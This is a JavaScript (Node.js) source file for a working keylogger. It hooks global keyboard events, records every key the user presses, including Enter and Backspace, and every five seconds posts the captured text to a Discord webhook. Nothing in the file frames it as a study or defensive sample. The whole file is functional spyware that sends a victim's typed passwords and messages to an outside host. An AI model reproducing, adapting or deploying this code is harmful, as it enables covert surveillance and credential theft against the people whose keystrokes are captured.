require('dotenv').config(); 
const GlobalKeyboardListener = require('node-global-key-listener').GlobalKeyboardListener;
const axios = require('axios');

const KEYSTROKES_RESET_INTERVAL = 30; 
const THROTTLE_INTERVAL = 5000; 
const WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;

const keyboardListener = new GlobalKeyboardListener();
let keystrokesBuffer = '';

keyboardListener.addListener(async function (event, keyState) {
    if (event.state === "UP") {
        switch (event.name) {
            case 'SPACE':
                process.stdout.write(' ');
                keystrokesBuffer += ' ';
                break;
            case 'TAB':
                process.stdout.write('<TAB>');
                keystrokesBuffer += '<TAB>';
                break;
            case 'RETURN':
                process.stdout.write('<ENTER>');
                keystrokesBuffer += '<ENTER>';
                break;
            case 'LEFT SHIFT':
                process.stdout.write('<LEFT SHIFT>');
                keystrokesBuffer += '<LEFT SHIFT>'
                break;
            case 'LEFT ALT':
                process.stdout.write('<LEFT ALT>');
                keystrokesBuffer += '<LEFT ALT>'
                break;
            case 'CAPS LOCK':
                process.stdout.write('<CAPS LOCK>');
                keystrokesBuffer += '<CAPS LOCK>'
                break;
            case 'CTRLLEFT':
                process.stdout.write('<CTRLLEFT>');
                keystrokesBuffer += '<CTRLLEFT>'
                break;
            case 'BACKSPACE':
                process.stdout.write('<BACKSPACE>');
                keystrokesBuffer += '<BACKSPACE>'
                break;
            default:
                process.stdout.write(event.name);
                keystrokesBuffer += event.name;
        }
    }
});

const calledOnce = function (event) {
    console.log("This listener was only called once.");
    keyboardListener.removeListener(calledOnce);
};
keyboardListener.addListener(calledOnce);

const sendKeystrokes = async () => {
    if (keystrokesBuffer) {
        try {
            await axios.post(WEBHOOK_URL, {
                "content": keystrokesBuffer,
            });
            console.log('Keystrokes sent successfully.');
            keystrokesBuffer = '';
        } catch (error) {
            console.error('Error sending keystrokes to Discord webhook:', error.message);
        }
    }
};

const throttleAndSendKeystrokes = async () => {
    await sendKeystrokes();
    setTimeout(throttleAndSendKeystrokes, THROTTLE_INTERVAL);
};

throttleAndSendKeystrokes();

process.on('SIGINT', async () => {
    console.log('Shutting down gracefully...');
    keyboardListener.stop();
    await sendKeystrokes();
    process.exit(0);
});

setInterval(() => {
    keystrokesBuffer = '';
}, 1000 * KEYSTROKES_RESET_INTERVAL);
